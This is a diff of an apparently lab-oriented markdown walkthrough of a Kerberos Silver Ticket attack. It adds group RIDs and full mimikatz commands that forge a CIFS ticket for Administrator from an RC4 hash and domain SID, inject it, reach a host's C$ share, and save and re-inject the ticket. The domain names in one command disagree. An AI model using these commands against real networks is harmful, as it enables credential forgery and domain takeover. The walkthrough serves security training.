@@ -60,18 +60,51 @@ kerberos::golden     ##Name of the module (there is no Silver module)
                 
  ```
  
-List current tickets
-```
-klist
-```
 
-<img src="/img/silver/.PNG" alt="Getting-gz" width="1000" height="200"> 
-
- 
+ ## group identifier
+```
+512 ##Domain Admins
+513 ##Domain Users
+518 ##Schema Admins
+519 ##Enterprise Admins
+520 ##Group Policy Creator Owners
+```
 Getting a user's SID
 ```
 whoami /user
 ```
 <img src="/img/silver/sid.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+Create the ticket
+```
+kerberos::golden /user:Administrator /domain:karim.net /rc4:de26cce0356891a4a020e7c4957afc72 /target:domainAD.karim.com /sid:S-1-5-21-750046758-1551849808-2392872301 /service:CIFS /id:500 /ptt
+```
+
+<img src="/img/silver/go.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+ 
+List current tickets
+```
+klist
+```
+
+<img src="/img/silver/klist.PNG" alt="Getting-gz" width="1000" height="200">
+```
+ dir \\domainAD.karim.net\c$
+ ```
+ <img src="/img/silver/da.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+save in file
+``` 
+kerberos::golden /user:Administrator /domain:karim.net /rc4:de26cce0356891a4a020e7c4957afc72 /target:domainAD.karim.com /sid:S-1-5-21-750046758-1551849808-2392872301 /service:CIFS /id:500 
+ ```
+
+<img src="/img/silver/f1.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+Inject in memory using mimikatz 
+```
+kerberos::ptt  ticket.kirbi
+```
+  
+<img src="/img/silver/f2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
